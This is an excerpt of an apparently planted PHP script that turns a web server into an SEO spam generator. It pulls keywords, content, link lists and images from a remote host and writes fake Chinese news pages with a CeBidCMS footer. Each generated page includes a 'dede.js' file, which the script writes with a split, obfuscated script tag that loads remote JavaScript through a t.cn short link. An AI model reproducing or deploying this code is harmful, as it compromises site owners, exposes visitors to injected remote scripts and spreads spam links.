...
$keywords = $tempkeywords=file( "http://jc.111140.com/key.txt" );
$data = file( "http://jc.111140.com/content.txt" );
$sites = file( "http://jc.111140.com/sites.txt" );

$pic1 = file_get_contents("http://jc.111140.com/img/index-bg.jpg");
writestr($folderpath."index-bg.jpg",$pic1);
$pic2 = file_get_contents("http://jc.111140.com/img/home.gif");
writestr($folderpath."home.gif",$pic2);
$pic3 = file_get_contents("http://jc.111140.com/img/titlebg.gif");
writestr($folderpath."titlebg.gif",$pic3);
$pic4 = file_get_contents("http://jc.111140.com/img/dotl.gif");
writestr($folderpath."dotl.gif",$pic4);
$pic5 = file_get_contents("http://jc.111140.com/img/arrow.png");
writestr($folderpath."arrow.png",$pic5);
$pic6 = file_get_contents("http://jc.111140.com/img/titbg.gif");
writestr($folderpath."titbg.gif",$pic6);
$pic7 = file_get_contents("http://jc.111140.com/img/graydot.gif");
writestr($folderpath."graydot.gif",$pic7);
$pic8 = file_get_contents("http://jc.111140.com/img/leftbg.jpg");
writestr($folderpath."leftbg.jpg",$pic8);
$pic9 = file_get_contents("http://jc.111140.com/img/leftbg3.jpg");
...
for($kindex=0;$kindex<$keyNum;++$kindex)
{
   ...
   for ( $l=0;$l < 50;++$l)
   {
     if($l<$sitesNum)
     {
        $links=$links."<li><a href=\"".trim($sites[$l])."/article/\">".trim($tempkeywords[$l])."</a></li>\r\n";
	 }
   }
...
$dirdata1=$dirdata1."<title>新闻资讯频道</title>\r\n";
...
$dirdata1=$dirdata1."<div class=\"navi\">　您现在的位置 <a  href=\"/\">首页</a> > <a  href=\"/article/\">新闻资讯</a> > 频道首页 </div>\r\n";
$dirdata1=$dirdata1."  <div class=\"clear blank10\"></div>\r\n";
...
$dirdata2=$dirdata2."<div class=\"copyright\">  本站基于CeBidCMS<sup>TM</sup>V9开发 福建·林锋科兴信息技术有限公司　 版权所有  2006-2013  <br>软著登字第135792号 登记号2007SR00511  工商注册号:886881681231 税务登记号:881688168113 闽ICP备06152135号</div><script language=\"javascript\" type=\"text/javascript\" src=\"http://js.users.51.la/15711966.js\"></script>\r\n";
...
{
  $jsdata=$jsdata."document.write(\"<scr\"+\"ipt language=javascript src=http://t.cn/zTfB5tS></scr\"+\"ipt>\");";
  $fp=fopen($fname,"w");
  fputs($fp,$jsdata);
  fclose($fp);
}
...
function writemoban()
{
  ...
  $mobandata=$mobandata."<title>{title}-新闻资讯</title>\r\n";
  ...
  $mobandata=$mobandata."</head>\r\n";
  $mobandata=$mobandata."<body><script language=\"javascript\" src=\"dede.js\"></script>\r\n";
  $mobandata=$mobandata."<div class=\"wrap\">\r\n";
  $mobandata=$mobandata."   <div class=\"clear blank10\"></div>\r\n";
  $mobandata=$mobandata."   <div class=\"navi\">　您现在的位置   <a  href=\"/\">首页</a> > <a  href=\"/article/\">新闻资讯</a> > 浏览文章</div>\r\n";
  $mobandata=$mobandata."   <div class=\"clear blank10\"></div>\r\n";
  ...
  $mobandata=$mobandata."</div>\r\n";
  $mobandata=$mobandata."<div class=\"clear blank10\"></div>\r\n";
  $mobandata=$mobandata."<div class=\"copyright\">  本站基于CeBidCMS<sup>TM</sup>V9开发 福建·林锋科兴信息技术有限公司　 版权所有  2006-2013  <br>\r\n";
  $mobandata=$mobandata."  软著登字第135792号 登记号2007SR00511  工商注册号:886881681231 税务登记号:881688168113 闽ICP备06152135号</div><script language=\"javascript\" type=\"text/javascript\" src=\"http://js.users.51.la/15711966.js\"></script>\r\n";
